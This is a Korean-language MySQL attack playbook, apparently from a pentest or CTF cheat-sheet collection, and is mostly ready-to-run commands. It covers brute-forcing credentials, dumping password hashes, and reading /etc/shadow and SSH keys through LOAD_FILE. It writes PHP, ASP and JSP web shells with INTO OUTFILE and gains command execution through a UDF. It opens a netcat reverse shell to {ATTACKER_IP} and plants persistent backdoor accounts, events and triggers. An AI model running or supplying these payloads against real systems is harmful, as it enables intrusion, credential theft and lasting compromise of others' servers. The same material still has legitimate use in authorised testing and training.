# 🐬 MYSQL ATTACKS (Port 3306)

> **목표: MySQL 서비스 발견 후 25-30분 내에 파일 시스템 접근 또는 중요 데이터 수집**

## ⚡ 즉시 실행할 명령어들

### 🚀 MySQL 발견 즉시 실행

```bash
# 1. MySQL 포트 및 버전 확인
nmap -sV -p 3306 {IP}
nmap --script mysql-* -p 3306 {IP}

# 2. 기본 자격증명 즉시 시도
mysql -h {IP} -u root -p
# Password 시도: (empty), root, mysql, password, admin, 123456

mysql -h {IP} -u admin -p
mysql -h {IP} -u mysql -p
mysql -h {IP} -u user -p

# 3. 익명 접근 시도
mysql -h {IP}
mysql -h {IP} -u '' -p

# 4. MySQL NSE 스크립트 실행 (백그라운드)
nmap --script mysql-enum,mysql-users,mysql-databases,mysql-variables -p 3306 {IP} &

# 5. Hydra 브루트포스 시작 (백그라운드)
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{IP} &
```

### ⚡ 연결 성공시 즉시 실행

```bash
# 기본 정보 수집
SELECT version();
SELECT user();
SELECT database();
SELECT @@hostname;

# 권한 확인
SHOW GRANTS;
SELECT * FROM mysql.user WHERE user = user();

# 데이터베이스 목록
SHOW DATABASES;
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (7분)

- [ ] **MySQL 포트 확인** `nmap -p 3306 {IP}`
- [ ] **MySQL 버전 확인** `nmap -sV -p 3306 {IP}`
- [ ] **기본 자격증명 시도** (root, admin, mysql)
- [ ] **익명 접근 시도**
- [ ] **연결 가능 여부 확인**

### 🔍 Phase 2: 권한 및 데이터 확인 (8분)

- [ ] **현재 사용자 권한 확인** `SHOW GRANTS`
- [ ] **FILE 권한 확인** (파일 읽기/쓰기)
- [ ] **데이터베이스 목록 확인** `SHOW DATABASES`
- [ ] **사용자 계정 확인** `SELECT * FROM mysql.user`
- [ ] **중요 테이블 확인**

### 💥 Phase 3: 파일 시스템 공격 (10분)

- [ ] **파일 읽기 시도** `LOAD_FILE()`
- [ ] **파일 쓰기 시도** `INTO OUTFILE`
- [ ] **웹쉘 업로드 시도** (웹 서비스 연계)
- [ ] **UDF 활용 시도** (시스템 명령 실행)
- [ ] **중요 시스템 파일 접근**

### 🎯 Phase 4: 데이터 수집 및 활용 (5분)

- [ ] **중요 데이터베이스 데이터 수집**
- [ ] **크레덴셜 정보 수집**
- [ ] **다른 서비스 연계 정보 확인**
- [ ] **지속적 접근 방법 모색**

---

## 🎯 상황별 대응

### 🔓 기본 자격증명 성공시

```bash
# root 계정으로 연결 성공
mysql -h {IP} -u root -p{PASSWORD}

# 연결 후 즉시 실행할 명령들:
SELECT version();
SELECT user();
SELECT @@hostname;
SELECT @@datadir;

# 권한 확인
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'%';

# 모든 사용자 확인
SELECT user, host, authentication_string FROM mysql.user;

# 데이터베이스 목록
SHOW DATABASES;
USE information_schema;
SELECT schema_name FROM schemata;
```

### 📁 FILE 권한 있는 경우 (파일 읽기/쓰기)

```bash
# FILE 권한 확인
SELECT user, file_priv FROM mysql.user WHERE user = user();

# 중요 시스템 파일 읽기
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/etc/hosts');
SELECT LOAD_FILE('/proc/version');

# Windows 시스템 파일
SELECT LOAD_FILE('C:/windows/system32/drivers/etc/hosts');
SELECT LOAD_FILE('C:/boot.ini');

# 웹 애플리케이션 설정 파일
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');

# SSH 키 파일
SELECT LOAD_FILE('/home/user/.ssh/id_rsa');
SELECT LOAD_FILE('/root/.ssh/id_rsa');

# MySQL 설정 파일
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('/etc/my.cnf');
```

### 🌐 웹쉘 업로드 (웹 서비스 연계)

```bash
# 웹 루트 디렉토리 확인
SELECT @@datadir;
SHOW VARIABLES LIKE 'secure_file_priv';

# PHP 웹쉘 업로드
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# 더 정교한 웹쉘
SELECT '<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>' INTO OUTFILE '/var/www/html/cmd.php';

# ASP 웹쉘 (Windows IIS)
SELECT '<% eval request("cmd") %>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';

# JSP 웹쉘 (Tomcat)
SELECT '<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>' INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp';

# 다양한 웹 루트 경로 시도
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/usr/share/nginx/html/shell.php';
```

### 💾 UDF (User Defined Functions) 활용

```bash
# lib_mysqludf_sys UDF 확인
SELECT * FROM mysql.func;

# UDF가 있는 경우 시스템 명령 실행
SELECT sys_eval('whoami');
SELECT sys_exec('id');
SELECT sys_get('pwd');

# UDF 수동 생성 (복잡하지만 강력)
# 1. UDF 라이브러리 업로드
SELECT hex(LOAD_FILE('/usr/lib/lib_mysqludf_sys.so')) INTO OUTFILE '/tmp/udf.hex';

# 2. 라이브러리를 MySQL 플러그인 디렉토리에 저장
SELECT UNHEX('UDF_HEX_CODE_HERE') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 3. UDF 함수 생성
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

# 4. 시스템 명령 실행
SELECT sys_exec('nc -e /bin/bash {ATTACKER_IP} 4444');
```

### 🔍 데이터베이스 정보 수집

```bash
# 모든 데이터베이스 확인
SHOW DATABASES;

# 특정 데이터베이스의 테이블 확인
USE mysql;
SHOW TABLES;

USE information_schema;
SELECT table_name FROM tables WHERE table_schema = 'database_name';

# 테이블 구조 확인
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;

# 중요 데이터 수집
SELECT * FROM users;
SELECT * FROM accounts;
SELECT username, password FROM login_table;
SELECT * FROM admin;

# 크레덴셜 정보 찾기
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%pass%' OR column_name LIKE '%user%';

# 데이터 개수 확인
SELECT COUNT(*) FROM table_name;

# 샘플 데이터 확인
SELECT * FROM table_name LIMIT 10;
```

### 🔐 브루트포스 공격 (기본 자격증명 실패시)

```bash
# Hydra를 이용한 MySQL 브루트포스
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{IP}
hydra -L users.txt -P passwords.txt mysql://{IP}

# 일반적인 MySQL 계정들
hydra -L mysql_users.txt -P passwords.txt mysql://{IP}
# mysql_users.txt: root, admin, mysql, user, test, guest, dba

# 특정 사용자에 대한 집중 공격
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{IP} -t 4 -W 3

# Medusa 사용
medusa -h {IP} -u root -P /usr/share/wordlists/rockyou.txt -M mysql

# nmap 브루트포스
nmap --script mysql-brute -p 3306 {IP}

# 사용자 열거 (오래된 MySQL 버전)
nmap --script mysql-enum -p 3306 {IP}
```

---

## 🚨 문제 해결

### 🚫 MySQL 연결 거부시

```bash
# 다른 MySQL 포트 확인
nmap -p 3306,3307,33060,33061 {IP}

# MySQL 8.0+ 새로운 기본 포트
nmap -p 33060 {IP}  # MySQL X Protocol

# bind-address 확인 (로컬 접근만 허용하는 경우)
nmap --script mysql-info -p 3306 {IP}

# SSL 연결 시도
mysql -h {IP} -u root -p --ssl-mode=REQUIRED
```

### 🔒 인증 실패시

```bash
# 다양한 사용자명/패스워드 조합
mysql_users=("root" "admin" "mysql" "user" "test" "guest" "dba")
passwords=("" "root" "admin" "mysql" "password" "123456" "toor" "pass")

for user in "${mysql_users[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "Trying $user:$pass"
        timeout 5 mysql -h {IP} -u $user -p$pass -e "SELECT 1;" 2>/dev/null && echo "SUCCESS: $user:$pass"
    done
done

# MySQL 8.0+ 인증 플러그인 문제
mysql -h {IP} -u root -p --default-auth=mysql_native_password
```

### 🚫 FILE 권한 없을 때

```bash
# 현재 권한 확인
SHOW GRANTS;
SELECT user, file_priv FROM mysql.user WHERE user = user();

# secure_file_priv 설정 확인
SHOW VARIABLES LIKE 'secure_file_priv';

# 다른 사용자로 시도 (권한이 다를 수 있음)
# 만약 다른 계정에 접근 가능하다면

# LOAD DATA INFILE 시도 (FILE 권한 없어도 가능할 수 있음)
CREATE TABLE temp_table (data TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table;
SELECT * FROM temp_table;
DROP TABLE temp_table;
```

### 📝 INTO OUTFILE 실패시

```bash
# 다른 경로 시도
SELECT 'test' INTO OUTFILE '/tmp/test.txt';
SELECT 'test' INTO OUTFILE '/var/tmp/test.txt';
SELECT 'test' INTO OUTFILE '/dev/shm/test.txt';

# Windows 경로
SELECT 'test' INTO OUTFILE 'C:/temp/test.txt';
SELECT 'test' INTO OUTFILE 'C:/windows/temp/test.txt';

# DUMPFILE 사용 (바이너리 파일용)
SELECT 'test' INTO DUMPFILE '/tmp/test.txt';

# 권한 확인
SELECT user, file_priv FROM mysql.user;
SHOW VARIABLES LIKE 'secure_file_priv';
```

### 🔍 데이터가 없을 때

```bash
# 숨겨진 데이터베이스 확인
SELECT schema_name FROM information_schema.schemata;

# 시스템 데이터베이스 확인
USE performance_schema;
USE sys;

# 다른 MySQL 인스턴스 확인
SHOW VARIABLES LIKE 'port';
SHOW VARIABLES LIKE 'socket';

# 바이너리 로그 확인 (이전 활동 추적)
SHOW BINARY LOGS;
SHOW BINLOG EVENTS;
```

---

## 🔗 다른 서비스와 연계

### 🌐 웹 애플리케이션과 연계

```bash
# 웹 애플리케이션 설정 파일에서 MySQL 크레덴셜 발견
# config.php, wp-config.php, database.yml 등에서 크레덴셜 수집 후 MySQL 접근

# MySQL에서 웹 디렉토리에 웹쉘 업로드
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/mysql_shell.php';

# 웹쉘 테스트
curl "http://{IP}/mysql_shell.php?cmd=whoami"

# 리버스쉘 실행
curl "http://{IP}/mysql_shell.php?cmd=nc -e /bin/bash {ATTACKER_IP} 4444"
```

### 📁 파일 시스템과 연계

```bash
# SSH 키 파일 읽기
SELECT LOAD_FILE('/home/user/.ssh/id_rsa');
SELECT LOAD_FILE('/root/.ssh/authorized_keys');

# 크론탭 확인
SELECT LOAD_FILE('/etc/crontab');
SELECT LOAD_FILE('/var/spool/cron/crontabs/root');

# 패스워드 파일
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');

# 네트워크 설정
SELECT LOAD_FILE('/etc/hosts');
SELECT LOAD_FILE('/etc/network/interfaces');
```

### 🗂️ 다른 데이터베이스와 연계

```bash
# MySQL에서 발견한 크레덴셜로 다른 DB 접근
# PostgreSQL
psql -h {IP} -U {MYSQL_USER} -d postgres

# MSSQL
impacket-mssqlclient {MYSQL_USER}:{MYSQL_PASS}@{IP}

# MongoDB
mongo {IP}:27017/{DATABASE} -u {MYSQL_USER} -p {MYSQL_PASS}
```

---

## 🛠️ 고급 MySQL 공격 기법

### 📊 SQL Injection과 연계

```bash
# 웹 애플리케이션의 SQL injection에서 파일 쓰기
' UNION SELECT 1,2,'<?php system($_GET["cmd"]); ?>',4 INTO OUTFILE '/var/www/html/inject.php'--

# LOAD_FILE을 통한 파일 읽기
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--

# INTO OUTFILE을 통한 데이터 추출
' UNION SELECT 1,2,3,concat(username,':',password) FROM users INTO OUTFILE '/tmp/creds.txt'--
```

### 🔍 MySQL 로그 분석

```bash
# 쿼리 로그 확인 (활성화된 경우)
SHOW VARIABLES LIKE 'general_log';
SHOW VARIABLES LIKE 'general_log_file';

# 에러 로그 확인
SHOW VARIABLES LIKE 'log_error';

# 슬로우 쿼리 로그
SHOW VARIABLES LIKE 'slow_query_log';
SHOW VARIABLES LIKE 'slow_query_log_file';

# 바이너리 로그 (복제 환경)
SHOW VARIABLES LIKE 'log_bin';
SHOW MASTER STATUS;
```

### 🎭 MySQL 지속성 및 백도어

```bash
# 새 사용자 생성 (관리자 권한)
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'BackdoorPass123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# 이벤트 스케줄러를 통한 지속성 (MySQL 5.1+)
SET GLOBAL event_scheduler = ON;

DELIMITER $$
CREATE EVENT backdoor_event
ON SCHEDULE EVERY 1 HOUR
DO
BEGIN
    SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/persistent.php';
END$$
DELIMITER ;

# 트리거를 통한 지속성
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON some_table
FOR EACH ROW
    SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/trigger.php';
```

---

## ⏱️ 시간 관리 가이드

### 🎯 7분 안에 완료할 것들

- [ ] MySQL 포트 및 버전 확인
- [ ] 기본 자격증명 시도 (root, admin 등)
- [ ] 연결 성공시 기본 정보 및 권한 확인
- [ ] 브루트포스 공격 시작 (백그라운드)

### 🔍 20분 안에 완료할 것들

- [ ] FILE 권한 확인 및 파일 읽기/쓰기 테스트
- [ ] 웹쉘 업로드 시도 (웹 서비스 연계)
- [ ] 중요 데이터베이스 데이터 수집
- [ ] UDF를 통한 시스템 명령 실행 시도

### 💥 30분 후 판단 기준

**성공 기준:**

- [ ] 파일 시스템 읽기/쓰기 권한 확보
- [ ] 웹쉘 업로드 성공으로 시스템 접근
- [ ] UDF를 통한 시스템 명령 실행 성공
- [ ] 중요 데이터베이스 정보 수집 완료

**중간 성공시 계속 진행:**

- [ ] 웹쉘을 통한 리버스쉘 획득 시도
- [ ] 수집한 크레덴셜로 다른 서비스 접근
- [ ] 파일 시스템 탐색으로 추가 정보 수집

**실패시 다음 단계:**

- [ ] 브루트포스를 백그라운드로 계속 실행
- [ ] 웹 애플리케이션에서 MySQL 크레덴셜 찾기
- [ ] 다른 데이터베이스 서비스 확인 (PostgreSQL, MSSQL)
- [ ] 다른 포트/서비스로 우선순위 이동

**다음 단계**:

- 웹쉘 업로드 성공시 `SHELLS/reverse-shells.md`로 리버스쉘 획득
- 파일 시스템 접근 성공시 중요 파일 수집 후 다른 서비스 공격
- 크레덴셜 수집시 SSH/SMB 등 다른 서비스에 활용
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
